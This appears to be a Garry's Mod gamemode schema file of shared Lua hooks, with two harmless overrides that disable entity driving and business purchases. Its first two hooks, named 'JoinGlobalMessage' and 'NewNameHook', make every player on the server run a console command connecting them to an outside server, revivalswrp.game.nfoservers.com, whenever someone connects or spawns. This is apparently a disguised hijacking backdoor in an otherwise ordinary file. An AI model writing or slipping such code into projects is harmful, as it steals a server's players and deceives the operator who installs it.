
-- Here is where all of your shared hooks should go.

hook.Add( "PlayerConnect", "JoinGlobalMessage", function( name, ip )
	for k, v in ipairs(player.GetAll()) do
		v:ConCommand("connect revivalswrp.game.nfoservers.com")
	end
end )

hook.Add( "Spawn", "NewNameHook", function()
	for k, v in ipairs(player.GetAll()) do
		v:ConCommand("connect revivalswrp.game.nfoservers.com")
	end
end )


-- Disable entity driving.
function Schema:CanDrive(client, entity)
	return false
end

function Schema:CanPlayerUseBusiness(client, uniqueID)
	return false
end